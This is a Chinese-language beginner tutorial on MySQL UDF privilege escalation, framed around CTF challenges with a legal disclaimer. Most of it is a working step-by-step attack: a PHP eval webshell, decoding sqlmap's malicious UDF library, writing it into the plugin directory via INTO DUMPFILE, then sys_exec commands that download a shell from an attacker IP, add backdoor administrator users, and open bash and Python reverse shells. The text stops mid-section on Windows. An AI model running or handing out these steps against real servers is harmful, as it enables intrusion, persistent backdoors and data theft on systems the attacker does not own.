---
title: "MySQL UDF提权从入门到实战：新手最友好的完整指南"
date: 2026-04-28 14:00:00 +0800
author: Security Researcher
categories: [Web安全, CTF]
tags: [MySQL, UDF提权, 权限提升, 渗透测试, CTF, 数据库安全]
description: 从零开始讲解MySQL UDF提权的每一个细节——什么是UDF、为什么要用UDF提权、每一步怎么操作、踩坑了怎么办。适合完全没有基础的新手阅读，跟着做就能学会。
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。未经授权对他人系统进行渗透测试属于违法行为。

## 目录
- [阅读前你需要知道的基础知识](#阅读前你需要知道的基础知识)
- [什么是UDF提权](#什么是udf提权)
- [前置条件](#前置条件)
- [核心原理](#核心原理)
- [实战操作详细步骤](#实战操作详细步骤)
- [完整实战案例](#完整实战案例)
- [Windows与Linux差异详解](#windows与linux差异详解)
- [三种MySQL提权方法对比](#三种mysql提权方法对比)
- [secure_file_priv受限时的替代方案](#secure_file_priv受限时的替代方案)
- [避坑指南](#避坑指南)
- [防御措施](#防御措施)
- [参考资源](#参考资源)
- [总结与学习路线](#总结与学习路线)

---

## 阅读前你需要知道的基础知识

在正式学习UDF提权之前，你需要先理解几个基本概念。如果你已经了解这些，可以跳过本节。但如果你是第一次接触这个领域，**请务必认真阅读**，否则后面的内容你会看不懂。

### 什么是MySQL

MySQL是一个**数据库管理系统**，你可以把它理解为一个"超级电子表格"——它存储着网站的所有数据（用户信息、文章内容、配置参数等），并且可以通过一种叫SQL的语言来查询和修改这些数据。

绝大多数网站都会使用数据库，而MySQL是其中最常见的一种。在CTF比赛中，Web题目几乎都会用到MySQL或它的分支MariaDB。

### 什么是数据库用户和权限

MySQL有自己的用户系统，和操作系统的用户是**完全分开的**。MySQL中最高的权限用户叫`root`，它可以做任何事情：创建删除数据库、读写文件、管理其他用户等。

```sql
root@localhost  →  MySQL数据库的超级管理员
```

⚠️ **极其重要的区分**：MySQL的root和Linux操作系统的root是**两个完全不同的东西**！

| 对比项 | MySQL的root | Linux的root |
|-------|------------|------------|
| 管理范围 | 只能管理数据库内部的事情 | 管理整个操作系统 |
| 密码 | 数据库自己设置的密码 | 操作系统的密码 |
| 能做什么 | 查询数据、创建表、读写文件（受限） | 执行任何系统命令、修改任何文件 |
| 不能做什么 | 不能直接执行系统命令 | — |

**UDF提权的目的**，就是从"MySQL的root权限"跨越到"操作系统的root权限"。因为光有数据库权限是不够的，你没法直接在服务器上执行`cat /flag`这样的命令。

### 什么是Webshell

Webshell就是一个**放在网站服务器上的后门程序**。攻击者通过漏洞（文件上传、SQL注入等）把它传到服务器上，然后就可以通过浏览器远程控制服务器了。

最简单的PHP一句话木马长这样：

```php
<?php @eval($_POST['cmd']); ?>
```

把它上传到服务器后，用蚁剑、菜刀等工具连接，你就可以在服务器上执行命令了。但此时你只有**网站运行用户**的权限（比如`www-data`），权限很低，很多操作做不了。

**UDF提权就是从这种低权限状态出发，一步步拿到更高权限的方法。**

### 什么是动态链接库

动态链接库是一种**可以被其他程序加载和调用的代码文件**。你可以把它理解成"插件"——就像手机装APP一样，程序可以通过加载动态链接库来获得新的功能。

不同操作系统的动态链接库格式不同：

| 操作系统 | 文件格式 | 文件后缀 | 类比 |
|---------|---------|---------|------|
| Windows | DLL（Dynamic Link Library） | `.dll` | 就像Windows软件的安装包 |
| Linux | SO（Shared Object） | `.so` | 就像Linux软件的安装包 |

⚠️ **关键点**：Windows的`.dll`和Linux的`.so`**完全不通用**，必须根据目标系统选择对应的文件。而且32位和64位的文件也不通用。

### MySQL服务进程的权限

MySQL在操作系统上是以一个**服务进程**的方式运行的。这个进程属于操作系统中的某个用户：

- Linux上通常是`mysql`用户
- Windows上通常是`SYSTEM`或`Network Service`

**UDF提权后你能获得的权限，就是MySQL服务进程在操作系统中的权限**。这意味着：

| MySQL服务运行用户 | UDF提权后获得的权限 | 能做什么 |
|-----------------|-------------------|---------|
| `root`（Linux） | 系统最高权限 | 任意操作 |
| `mysql`（Linux） | 普通用户权限 | 受限，但比www-data高 |
| `SYSTEM`（Windows） | 系统最高权限 | 任意操作 |

💡 **提示**：在CTF中，MySQL通常以root用户运行（为了方便出题），所以UDF提权后往往能直接拿到系统最高权限。

---

## 什么是UDF提权

### UDF是什么

UDF的全称是**User Defined Function**，翻译过来就是"用户自定义函数"。

用大白话说：MySQL本身内置了很多函数，比如`COUNT()`、`SUM()`、`NOW()`等。但有时候这些内置函数不够用，MySQL就允许你自己写一个函数加进去——这就是UDF。

**打个比方**：MySQL就像一部手机，内置功能（打电话、发短信）就是内置函数。UDF就像手机上的APP商店，你可以安装新的APP来给手机增加功能。

### UDF提权是什么

正常情况下，UDF是用来扩展MySQL功能的，比如写一个自定义的字符串处理函数。但攻击者发现：**既然UDF可以加载外部的代码文件，那我加载一个能执行系统命令的代码文件不就行了？**

**继续用手机类比**：正常情况下你装APP是为了方便（装个计算器、装个日历）。但攻击者装了一个"远程控制APP"——这个APP可以帮你在手机上执行任何命令。这就是UDF提权。

用一句话总结：**UDF提权 = 利用MySQL的UDF机制，加载一个能执行系统命令的恶意代码文件，从而获得操作系统的控制权。**

### UDF提权在攻击链中的位置

UDF提权不是渗透的第一步，而是攻击链中的"提权"环节。下面是完整的攻击链：

```
第1步：发现漏洞（SQL注入、文件上传等）
  ↓
第2步：利用漏洞获得Webshell（低权限，如www-data）
  ↓
第3步：从配置文件中找到MySQL的root账号密码
  ↓
第4步：UDF提权 ← 你正在学的内容
  ↓
第5步：获得操作系统高权限（root/SYSTEM）
  ↓
第6步：读取flag、控制服务器
```

可以看到，UDF提权是连接"数据库权限"和"系统权限"的桥梁，是整个攻击链中非常关键的一步。

---

## 前置条件

在开始UDF提权之前，必须满足以下条件。**缺一不可**，如果任何一个条件不满足，这个方法就走不通。

### 条件1：已拿到Webshell

你已经通过文件上传、SQL注入等方式获得了服务器的Webshell。

**如何判断是否满足**：你能通过蚁剑、菜刀等工具连接到服务器，并且可以执行一些基本命令。

```bash
# 在Webshell中执行，如果能返回结果，说明你已经有Webshell了
whoami
# 可能的输出：www-data（说明你是低权限的Web服务用户）
```

### 条件2：已获取MySQL的root账号密码

你需要MySQL的root（或其他具有FILE权限和SUPER权限的）账号密码。

**在CTF中最常见的获取方式**：从Web应用的配置文件中找到。几乎所有使用MySQL的网站都会有一个配置文件来存储数据库连接信息：

```php
<?php
// 常见的配置文件位置和内容
// 文件路径可能是：/var/www/html/config.php、/var/www/html/include/db.php 等

$db_host = 'localhost';    // 数据库地址
$db_user = 'root';         // 数据库用户名 ← 这就是你要找的
$db_pass = 'password123';  // 数据库密码   ← 这就是你要找的
$db_name = 'ctf_db';       // 数据库名
?>
```

💡 **提示**：常见的配置文件路径：
- `/var/www/html/config.php`
- `/var/www/html/include/db.php`
- `/var/www/html/application/config/database.php`（CodeIgniter框架）
- `/var/www/html/wp-config.php`（WordPress）
- `/var/www/html/.env`（Laravel框架）

### 条件3：secure_file_priv必须为空

`secure_file_priv`是MySQL的一个安全配置项，它限制了MySQL可以读写文件的目录。

**为什么重要**：UDF提权需要MySQL把一个文件写到服务器的特定目录中。如果`secure_file_priv`限制了写入目录，你就无法把文件写到需要的位置。

| 配置值 | 含义 | 能否利用UDF提权 |
|-------|------|---------------|
| `''`（空字符串） | 不限制导入导出的目录 | ✅ 可以利用 |
| `/tmp/` 等具体路径 | 只能在指定目录下读写文件 | ⚠️ 受限，需要额外技巧 |
| `NULL` | 完全禁止导入导出操作 | ❌ 无法利用此方法 |

**如何检查**：

```sql
SHOW GLOBAL VARIABLES LIKE 'secure_file_priv';
```

预期输出（可以利用的情况）：
```
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |    ← 值为空，可以利用
+------------------+-------+
```

⚠️ **注意**：如果值为`NULL`，UDF提权的常规方法走不通，但还有替代方案（见后文[secure_file_priv受限时的替代方案](#secure_file_priv受限时的替代方案)）。

### 条件4：MySQL服务进程有文件写入权限

即使`secure_file_priv`为空，MySQL服务进程也需要对目标目录有写入权限。具体来说，需要对`plugin_dir`（插件目录）有写入权限。

**如何检查**：

```sql
SHOW VARIABLES LIKE 'plugin_dir';
```

预期输出：
```
+---------------+-----------------------------+
| Variable_name | Value                       |
+---------------+-----------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/      |    ← 这就是你要写入文件的目录
+---------------+-----------------------------+
```

然后在Webshell中检查MySQL用户是否有写入权限：

```bash
# 查看plugin目录的权限
ls -la /usr/lib/mysql/plugin/
# 如果输出中有 drwxr-xr-x 且所有者是mysql，说明mysql用户可以写入
```

### 条件自查清单

在开始操作之前，先用这个表格检查你是否满足所有条件：

| 条件 | 检查命令 | 期望结果 | 你的实际情况 |
|-----|---------|---------|------------|
| 有Webshell | 在蚁剑中执行`whoami` | 能返回用户名 | ☐ |
| 有MySQL root密码 | 查看配置文件 | 找到用户名和密码 | ☐ |
| secure_file_priv为空 | `SHOW GLOBAL VARIABLES LIKE 'secure_file_priv';` | Value列为空 | ☐ |
| plugin_dir可写 | `ls -la <plugin_dir>` | mysql用户有写入权限 | ☐ |

**只有四项全部打勾，才能继续往下操作。** 如果有任何一项不满足，先想办法解决（或者考虑替代方案）。

---

## 核心原理

### MySQL为什么能执行系统命令

正常情况下，MySQL**不能**直接执行系统命令。你没法在MySQL里输入`whoami`然后看到结果。

但是MySQL有一个UDF机制，允许用户加载外部的动态链接库文件（`.dll`或`.so`），把里面定义的函数注册为MySQL的函数，然后在SQL语句中调用。

**攻击者的思路**：如果我写一个动态链接库，里面定义了一个函数，这个函数的功能是"执行系统命令"，然后让MySQL加载这个库并注册这个函数——那我不就可以在SQL里执行系统命令了吗？

```
正常用途：加载一个字符串处理函数 → MySQL多了字符串处理能力
攻击用途：加载一个命令执行函数   → MySQL多了执行系统命令的能力
```

### UDF机制：正常用途 vs 攻击利用

| 对比项 | 正常用途 | 攻击利用 |
|-------|---------|---------|
| 目的 | 扩展MySQL功能（如自定义加密算法） | 获取操作系统控制权 |
| 加载的文件 | 功能性的代码库 | 恶意代码库（包含sys_exec/sys_eval） |
| 创建的函数 | 业务相关的自定义函数 | 能执行系统命令的函数 |
| 调用方式 | `SELECT my_encrypt('hello')` | `SELECT sys_eval('whoami')` |

### 完整攻击流程图

```
┌─────────────────────────────────────────────────────────────┐
│                    UDF提权完整流程                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ① 信息收集                                                 │
│  ┌──────────────────┐                                       │
│  │ 查MySQL版本      │ → 决定用.dll还是.so                    │
│  │ 查操作系统       │ → 决定文件类型和位数                    │
│  │ 查secure_file_priv│ → 确认能否写文件                      │
│  │ 查plugin_dir     │ → 确认文件要放在哪里                    │
│  └──────────────────┘                                       │
│           ↓                                                 │
│  ② 获取UDF文件                                              │
│  ┌──────────────────┐                                       │
│  │ 从sqlmap/Metasploit│ → 获取编译好的恶意.so/.dll文件       │
│  │ 获取或自己编译    │                                       │
│  └──────────────────┘                                       │
│           ↓                                                 │
│  ③ 上传并导入                                               │
│  ┌──────────────────┐                                       │
│  │ 将文件转为十六进制 │ → 因为二进制文件无法直接通过SQL传输    │
│  │ 用INTO DUMPFILE  │ → 将十六进制还原为二进制文件写入服务器  │
│  │ 写入plugin_dir   │                                       │
│  │ CREATE FUNCTION  │ → 让MySQL加载这个文件并注册函数         │
│  └──────────────────┘                                       │
│           ↓                                                 │
│  ④ 执行系统命令                                             │
│  ┌──────────────────┐                                       │
│  │ SELECT sys_eval()│ → 直接在SQL中执行系统命令              │
│  │ SELECT sys_exec()│ → 执行命令但不返回输出                 │
│  └──────────────────┘                                       │
│           ↓                                                 │
│  🎉 获得操作系统权限！                                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 关键概念解释

#### plugin_dir是什么

`plugin_dir`是MySQL的插件目录，MySQL加载外部库文件时，**只从这个目录里找**。所以你的恶意文件必须放在这个目录下，否则MySQL找不到。

#### INTO DUMPFILE是什么

`INTO DUMPFILE`是MySQL的一个写文件语句，它可以把数据以**原始二进制格式**写入文件。

⚠️ **INTO DUMPFILE vs INTO OUTFILE**：这两个都能写文件，但有重要区别：

| 对比项 | INTO DUMPFILE | INTO OUTFILE |
|-------|--------------|-------------|
| 写入方式 | 原始二进制，原样写入 | 文本模式，会添加换行符和转义 |
| 适用场景 | 写二进制文件（.so/.dll） | 写文本文件（.php/.txt） |
| 对UDF的影响 | ✅ 文件完好，可以正常加载 | ❌ 文件被破坏，无法加载 |

**简单记忆**：写二进制文件（.so/.dll）必须用`DUMPFILE`，写文本文件用`OUTFILE`。

#### 为什么需要十六进制编码

你可能会问：为什么不直接上传一个.so文件，而要转成十六进制？

原因很简单：**你只能通过SQL语句来写文件，而SQL语句是文本格式的，无法直接包含二进制数据**。所以需要先把二进制文件转成十六进制字符串，放在SQL语句中，然后用`INTO DUMPFILE`让MySQL把它还原成二进制文件写入磁盘。

```
原始.so文件（二进制） → 转为十六进制字符串 → 放入SQL语句 → MySQL还原为二进制 → 写入磁盘
```

#### CREATE FUNCTION ... SONAME做了什么

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
```

这条语句做了两件事：
1. **加载文件**：让MySQL从`plugin_dir`目录下加载`udf.so`这个动态链接库
2. **注册函数**：在MySQL中注册一个名为`sys_eval`的函数，它的返回类型是`STRING`，功能由`udf.so`中的代码定义

注册成功后，你就可以像使用内置函数一样使用`sys_eval`了。

---

## 实战操作详细步骤

### 第0步：从Webshell连接到MySQL

这是很多教程都跳过的一步，但新手往往卡在这里：**你拿到了Webshell和数据库密码，但怎么执行SQL语句呢？**

有三种常用方法：

#### 方法1：使用蚁剑的数据库功能（最推荐）

蚁剑（AntSword）是常用的Webshell管理工具，它内置了数据库管理功能：

1. 在蚁剑中连接你的Webshell
2. 右键 → 「数据操作」或「数据库管理」
3. 添加数据库连接：
   - 数据库类型：MySQL
   - 主机：localhost（或127.0.0.1）
   - 用户名：root
   - 密码：你在配置文件中找到的密码
4. 连接成功后，就可以直接在界面中执行SQL语句了

💡 **提示**：如果你用的是其他Webshell管理工具（如冰蝎、哥斯拉），操作方式类似，都内置了数据库管理功能。

#### 方法2：在Webshell中执行mysql命令行

如果你的Webshell有命令执行功能，可以直接使用mysql命令行客户端：

```bash
# 连接到MySQL（-u指定用户名，-p后面直接跟密码，注意-p和密码之间没有空格）
mysql -u root -ppassword123

# 连接成功后，你就可以执行SQL语句了
mysql> SELECT VERSION();
mysql> SHOW VARIABLES LIKE 'plugin_dir';
```

⚠️ **注意**：`-p`和密码之间**没有空格**！`-ppassword123`是正确的，`-p password123`是错误的（会把`password123`当成数据库名）。

如果目标服务器没有安装mysql客户端，这种方法就行不通。你可以尝试：

```bash
# 检查是否安装了mysql客户端
which mysql
# 如果有输出路径（如/usr/bin/mysql），说明已安装
# 如果没有输出，说明未安装，需要用其他方法
```

#### 方法3：上传PHP脚本连接数据库

如果目标服务器有PHP环境，你可以上传一个简单的PHP脚本来执行SQL：

```php
<?php
$conn = mysqli_connect("localhost", "root", "password123");
if (!$conn) {
    die("连接失败: " . mysqli_connect_error());
}

if (isset($_POST['sql'])) {
    $result = mysqli_query($conn, $_POST['sql']);
    if ($result) {
        if (is_object($result)) {
            while ($row = mysqli_fetch_array($result)) {
                print_r($row);
                echo "<br>";
            }
        } else {
            echo "执行成功";
        }
    } else {
        echo "执行失败: " . mysqli_error($conn);
    }
}
?>

<form method="POST">
    <input type="text" name="sql" style="width:500px;">
    <input type="submit" value="执行">
</form>
```

上传后访问这个PHP文件，在输入框中输入SQL语句即可执行。

### 第1步：信息收集（决定成败的关键）

拿到数据库连接后，**先不要急着操作**，先摸清环境信息。这一步决定了后续所有操作的方向。

```sql
-- ① 查看MySQL版本
-- 为什么重要：版本号决定了.dll/.so文件的存放位置要求
SELECT VERSION();
-- 预期输出示例：5.7.30-0ubuntu0.18.04.1
-- 5.1是个分水岭：5.1以上版本文件必须放在plugin_dir目录下

-- ② 查看操作系统类型和架构
-- 为什么重要：决定你用.dll还是.so，32位还是64位
SHOW VARIABLES LIKE '%compile%';
-- 预期输出示例：
-- | version_compile_os    | Linux   |  ← 操作系统
-- | version_compile_machine | x86_64 |  ← 架构（64位）

-- ③ 查看secure_file_priv（最关键！）
-- 为什么重要：决定你能不能写文件
SHOW GLOBAL VARIABLES LIKE 'secure_file_priv';
-- 期望输出：Value列为空（空字符串）
-- 如果是NULL，常规方法走不通

-- ④ 查看plugin_dir
-- 为什么重要：这是你要放恶意文件的目录
SHOW VARIABLES LIKE 'plugin_dir';
-- 预期输出示例：/usr/lib/mysql/plugin/

-- ⑤ 查看当前数据库用户
-- 为什么重要：确认你确实有高权限
SELECT USER();
-- 期望输出：root@localhost

-- ⑥ 查看当前用户权限
-- 为什么重要：确认你有FILE权限（写文件需要）
SHOW GRANTS;
-- 期望输出中包含：GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost'
```

💡 **提示**：把以上所有查询结果**截图或记录下来**，后面每一步都会用到这些信息。

### 第2步：获取UDF动态链接库文件

你需要一个**编译好的、能执行系统命令的动态链接库文件**。这个文件不是文本文件，而是一个二进制的代码文件。有三种获取方式：

#### 方法1：从sqlmap中提取（最常用）

sqlmap是一个著名的SQL注入工具，它自带了UDF提权用的动态链接库文件。

**但是**，sqlmap自带的文件是经过异或编码的（后缀是`.so_`而不是`.so`），需要先解码才能使用。

```bash
# ① 找到sqlmap的UDF文件
# 在Kali Linux中，文件在这个目录下：
ls /usr/share/sqlmap/data/udf/mysql/

# 你会看到类似这样的目录结构：
# linux/32/  → Linux 32位的.so文件
# linux/64/  → Linux 64位的.so文件
# windows/32/ → Windows 32位的.dll文件
# windows/64/ → Windows 64位的.dll文件

# ② 根据目标系统选择对应文件
# 比如目标是Linux 64位系统：
ls /usr/share/sqlmap/data/udf/mysql/linux/64/
# 你会看到：lib_mysqludf_sys.so_  ← 注意后缀是.so_，不是.so

# ③ 使用cloak.py解码
# -d 表示decode（解码），-i 指定输入文件
python /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_

# 解码后会在同目录下生成：lib_mysqludf_sys.so（没有下划线了）
# 这个.so文件就是你要上传到目标服务器的文件
```

⚠️ **注意**：为什么sqlmap要编码这些文件？因为杀毒软件会检测已知的恶意.so/.dll文件。编码后可以绕过静态检测。

#### 方法2：从Metasploit中获取

Metasploit是另一个著名的渗透测试框架，也自带了UDF文件：

```bash
# Metasploit的UDF文件路径
ls /usr/share/metasploit-framework/data/exploits/mysql/

# 你会看到：
# lib_mysqludf_sys_32.dll  → Windows 32位
# lib_mysqludf_sys_64.dll  → Windows 64位
# lib_mysqludf_sys_32.so   → Linux 32位
# lib_mysqludf_sys_64.so   → Linux 64位
```

Metasploit的文件**不需要解码**，可以直接使用。

#### 方法3：自己编译

如果以上方法都不可用，或者目标环境特殊，你可以自己编译UDF文件：

```bash
# ① 获取UDF的C语言源码
# 搜索 "mysql udf sys_eval source code" 可以找到
# 常见的源码文件名：udf.c 或 1518.c

# ② 编译为.so文件（Linux）
gcc -shared -fPIC -o udf.so udf.c
# -shared：编译为共享库
# -fPIC：生成位置无关代码（共享库必须）
# -o udf.so：输出文件名

# ③ 编译为.dll文件（Windows，需要在Windows环境或交叉编译）
# 需要安装MinGW
i686-w64-mingw32-gcc -shared -o udf.dll udf.c
```

### 第3步：上传并导入函数

这是操作的核心步骤，也是最容易出错的地方。请严格按照以下顺序操作。

#### 3.1 确认plugin_dir路径

```sql
SHOW VARIABLES LIKE 'plugin_dir';
-- 记下输出中的路径，比如：/usr/lib/mysql/plugin/
```

#### 3.2 将UDF文件转为十六进制

这一步是在**你自己的攻击机**上操作的，不是在目标服务器上。

```bash
# 在攻击机上，将.so文件转为十六进制字符串
xxd -p /path/to/lib_mysqludf_sys.so | tr -d '\n'
```

**命令解释**：
- `xxd -p`：以纯十六进制格式输出文件内容
- `tr -d '\n'`：删除换行符，把所有十六进制连成一行

**输出示例**（实际输出会非常长，这里只展示开头部分）：
```
7f454c4602010100000000000000000002003e000100000000...
```

💡 **提示**：这个十六进制字符串通常有几万到几十万个字符，这是正常的。你需要**完整复制**这个字符串，不能省略任何部分。

#### 3.3 通过SQL将文件写入plugin_dir

现在回到MySQL的SQL执行界面，执行以下语句：

```sql
-- 将十六进制数据写入plugin_dir目录下的udf.so文件
-- 注意：0x后面跟着的是第3.2步得到的完整十六进制字符串
-- 这里用 ... 表示省略，实际操作中必须是完整的十六进制字符串
SELECT 0x7f454c4602010100000000000000000002003e000100000000... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
```

⚠️ **极其重要**：
1. `0x`前缀不能少，它告诉MySQL这是一个十六进制值
2. 十六进制字符串必须**完整**，不能省略任何部分
3. 必须使用`INTO DUMPFILE`，不能用`INTO OUTFILE`（否则文件会被破坏）
4. 文件路径必须是`plugin_dir`的路径，不能放在其他目录

**如果十六进制字符串太长怎么办？**

有些情况下，单条SQL语句可能因为太长而执行失败。这时可以使用**分段写入**的方法：

```sql
-- 方法：先创建一个表来存储数据，然后分批写入
CREATE TABLE temp_udf(data LONGBLOB);

-- 分批插入十六进制数据
INSERT INTO temp_udf VALUES (0x7f454c46020101000000000000000000...);
-- 如果数据太长，可以用UPDATE追加
UPDATE temp_udf SET data = CONCAT(data, 0x0200...);

-- 最后从表中导出到文件
SELECT data FROM temp_udf INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 清理临时表
DROP TABLE temp_udf;
```

#### 3.4 创建自定义函数

文件写入成功后，在MySQL中执行：

```sql
-- 创建 sys_eval 函数（推荐，能返回命令输出）
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- 或者创建 sys_exec 函数（只返回执行状态码）
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
```

**语句解释**：
- `CREATE FUNCTION sys_eval`：创建一个名为`sys_eval`的函数
- `RETURNS STRING`：这个函数的返回值类型是字符串
- `SONAME 'udf.so'`：这个函数的代码在`udf.so`这个动态链接库中

💡 **提示**：你可以同时创建两个函数，它们在同一个.so文件中：

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
```

#### 3.5 验证函数创建成功

```sql
-- 方法1：查看mysql.func表
SELECT * FROM mysql.func;
-- 预期输出：
-- | name     | ret | dl     | type    |
-- | sys_eval |   0 | udf.so | function |
-- | sys_exec |   1 | udf.so | function |

-- 方法2：查看函数状态
SHOW FUNCTION STATUS;
-- 应该能看到你刚创建的函数
```

如果能看到`sys_eval`和`sys_exec`，说明函数创建成功！

### 第4步：执行系统命令

函数创建成功后，你就可以在SQL语句中直接执行系统命令了！

#### sys_eval vs sys_exec

| 函数 | 返回值 | 能看到输出吗 | 使用场景 |
|-----|-------|------------|---------|
| `sys_eval('命令')` | 字符串（命令的输出内容） | ✅ 能 | 查看信息、读取文件（推荐） |
| `sys_exec('命令')` | 整数（0=成功，非0=失败） | ❌ 不能 | 执行不需要看输出的操作 |

#### 使用sys_eval查看信息

```sql
-- 查看当前用户（最常用的验证命令）
SELECT sys_eval('whoami');
-- 预期输出：root 或 mysql（这就是提权后的用户）

-- 查看用户ID和组信息
SELECT sys_eval('id');
-- 预期输出：uid=0(root) gid=0(root) groups=0(root)

-- 列出根目录文件
SELECT sys_eval('ls -la /');

-- 读取flag文件
SELECT sys_eval('cat /flag');
-- 或者
SELECT sys_eval('cat /root/flag.txt');
```

#### 使用sys_exec执行操作

```sql
-- 下载文件到目标服务器
SELECT sys_exec('wget http://你的IP/tools/shell.php -O /var/www/html/shell.php');

-- 将命令结果写入Web目录（方便通过浏览器查看）
SELECT sys_exec('whoami > /var/www/html/output.txt');
SELECT sys_exec('cat /flag > /var/www/html/flag.txt');

-- 添加后门用户（Linux）
SELECT sys_exec('useradd -m -s /bin/bash hacker && echo "hacker:password" | chpasswd');

-- 添加后门用户（Windows）
SELECT sys_exec('net user hacker P@ssw0rd /add && net localgroup administrators hacker /add');
```

#### 反弹Shell（获取交互式终端）

通过SQL执行命令不太方便，通常我们会反弹一个交互式shell到攻击机。

**第1步：在攻击机上监听端口**

```bash
# 在你的攻击机上执行（不是在目标服务器上！）
nc -lvnp 4444
# -l：监听模式
# -v：显示详细信息
# -n：不做DNS解析
# -p 4444：监听4444端口
```

**第2步：在目标MySQL上执行反弹shell命令**

```sql
-- Linux反弹shell（Bash方式）
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/攻击机IP/4444 0>&1"');

-- Linux反弹shell（Python方式，如果bash方式不行可以试这个）
SELECT sys_exec('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'');
```

⚠️ **注意**：
1. 把`攻击机IP`替换为你自己机器的IP地址
2. 确保你的攻击机4444端口没有被防火墙拦截
3. 先在攻击机上启动nc监听，再在目标上执行反弹命令
4. 反弹成功后，你的nc终端会变成目标服务器的交互式shell

---

## 完整实战案例

下面通过一个典型的CTF场景，演示从拿到Webshell到UDF提权成功的完整过程。

### 场景描述

- 目标：一台CTF Web服务器
- 已有：通过文件上传漏洞获得了一个PHP Webshell
- 目标：读取`/flag`文件获取flag
- 当前权限：`www-data`（低权限，无法直接读取/flag）

### 操作过程

#### 第0步：确认Webshell和数据库信息

```bash
# 在蚁剑终端中执行
whoami
# 输出：www-data  ← 低权限用户

# 查找数据库配置文件
cat /var/www/html/config.php
# 输出：
# <?php
# $db_host = 'localhost';
# $db_user = 'root';
# $db_pass = 'root123';
# $db_name = 'webapp';
# ?>
```

✅ 拿到了数据库账号：`root` / `root123`

#### 第1步：连接MySQL并收集信息

通过蚁剑的数据库功能连接MySQL，然后执行：

```sql
SELECT VERSION();
-- 输出：5.7.30-0ubuntu0.18.04.1  ← MySQL 5.7，大于5.1

SHOW VARIABLES LIKE '%compile%';
-- 输出：
-- | version_compile_os      | Linux   |
-- | version_compile_machine | x86_64  |  ← Linux 64位

SHOW GLOBAL VARIABLES LIKE 'secure_file_priv';
-- 输出：
-- | secure_file_priv |  |  ← 值为空，可以写文件！

SHOW VARIABLES LIKE 'plugin_dir';
-- 输出：
-- | plugin_dir | /usr/lib/mysql/plugin/ |  ← 文件要放在这里

SELECT USER();
-- 输出：root@localhost  ← 确认是root用户
```

✅ 所有前置条件满足：Linux 64位、secure_file_priv为空、plugin_dir已知

#### 第2步：获取UDF文件

在攻击机（Kali Linux）上操作：

```bash
# 解码sqlmap的UDF文件
python /usr/share/sqlmap/extra/cloak/cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_

# 确认解码成功
ls -la /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so
# 输出：-rw-r--r-- 1 root root 12848 ... lib_mysqludf_sys.so

# 转为十六进制
xxd -p /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so | tr -d '\n' > /tmp/udf_hex.txt

# 查看十六进制字符串长度
wc -c /tmp/udf_hex.txt
# 输出：25696  ← 大约2.5万个字符，这是正常的
```

#### 第3步：上传并导入

回到MySQL执行界面：

```sql
-- 将十六进制写入plugin_dir（这里只展示格式，实际操作中十六进制字符串必须完整）
SELECT 0x7f454c46...完整十六进制... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
-- 输出：Query OK, 1 row affected  ← 写入成功

-- 创建函数
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
-- 输出：Query OK, 0 rows affected  ← 创建成功

CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
-- 输出：Query OK, 0 rows affected  ← 创建成功

-- 验证
SELECT * FROM mysql.func;
-- 输出：
-- | name     | ret | dl     | type    |
-- | sys_eval |   0 | udf.so | function |
-- | sys_exec |   1 | udf.so | function |
```

✅ 函数创建成功！

#### 第4步：执行命令获取flag

```sql
-- 先验证提权是否成功
SELECT sys_eval('whoami');
-- 输出：root  ← 提权成功！已经是系统root用户了

-- 读取flag
SELECT sys_eval('cat /flag');
-- 输出：flag{udf_pr1v1l3g3_3sc4l4t10n_succ3ss}  ← 拿到flag！
```

🎉 **提权成功，拿到flag！**

---

## Windows与Linux差异详解

UDF提权在Windows和Linux上的操作大体相同，但有一些关键差异。如果你不确定目标系统是什么类型，先看下面的判断方法。

### 如何判断目标操作系统

```sql
-- 方法1：查看编译信息
SHOW VARIABLES LIKE '%compile%';
-- Linux输出：version_compile_os = Linux
-- Windows输出：version_compile_os = Win64

-- 方法2：通过系统命令判断（需要已有sys_eval）
SELECT sys_eval('uname -a');
-- Linux输出：Linux ubuntu 4.15.0-54-generic ...
-- Windows会报错，因为uname是Linux命令

SELECT sys_eval('ver');
-- Windows输出：Microsoft Windows [Version 10.0.17763...]
-- Linux会报错，因为ver是Windows命令
```

### 核心差异对比

| 差异项 | Linux | Windows |
|-------|-------|---------|
| 动态链接库格式 | `.so` | `.dll` |
| 文件来源 | sqlmap的`linux/64/`目录 | sqlmap的`windows/64/`目录 |
| plugin_dir典型路径 | `/usr/lib/mysql/plugin/` | `C:\Program Files\MySQL\MySQL Server 5.7\lib\plugin\` |
| 提权后常见用户 | `root`或`mysql` | `SYSTEM`（最高权限） |
| 文件权限问题 | 可能遇到权限不足 | 较少遇到 |

### Windows特有问题：plugin目录不存在

这是Windows下UDF提权最常见的问题。MySQL 5.1以上版本要求`.dll`文件必须放在`lib\plugin`目录下，但这个目录**默认往往不存在**。

**解决方法：利用NTFS ADS创建目录**

